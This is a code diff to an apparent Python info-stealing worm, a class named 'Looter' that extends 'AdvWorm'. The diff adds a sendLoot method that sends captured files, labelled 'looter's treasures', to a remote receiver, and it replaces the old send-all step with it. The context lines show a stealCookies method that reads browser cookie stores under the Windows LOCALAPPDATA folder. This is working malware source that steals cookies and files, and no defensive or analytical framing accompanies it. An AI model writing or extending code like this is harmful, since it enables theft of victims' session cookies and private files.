@@ -49,6 +49,18 @@ class Looter(AdvWorm):
         for fp in self.tooCapture:
             self.sendFile(fp[0], fp[1])
     
+    def sendLoot(self) -> None:
+        dirIndex = self.IG.generate()
+        msg = self.makeSysMsg(["w", "loot", "looter's treasures", dirIndex])
+        self.sendMsg(msg)
+        sleep(0.5)
+        self.sendMsg(f"Start sending {len(self.tooCapture)} files")
+        sleep(1)
+        for ts in self.tooCapture:
+            self.sendFile(ts[0], ts[1], dirIndex)
+        sleep(0.5)
+        
+    
     def stealCookies(self) -> None:
         prefix = os.getenv("LOCALAPPDATA")
         for n, p in self.cookiesLoc.items():
@@ -69,4 +81,5 @@ class Looter(AdvWorm):
         self.getWinDir()
         self.findFile()
         print("START DOWNLOAD")
-        self.sendAllFile()
+        self.sendLoot()
+        return False
